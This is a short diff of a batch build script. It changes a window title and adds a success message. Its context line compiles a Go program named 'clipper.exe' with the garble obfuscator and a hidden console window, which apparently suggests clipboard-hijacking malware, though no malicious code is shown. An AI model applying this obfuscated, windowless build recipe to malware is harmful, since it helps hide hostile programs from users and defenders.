@@ -12,7 +12,8 @@ garble -tiny build -ldflags="-s -w -H=windowsgui" -o clipper.exe
 
 cls
 
-title Compressing...
+title Success!
 
+echo Success builded!.. Build available at .\clipper.exe
 
 pause
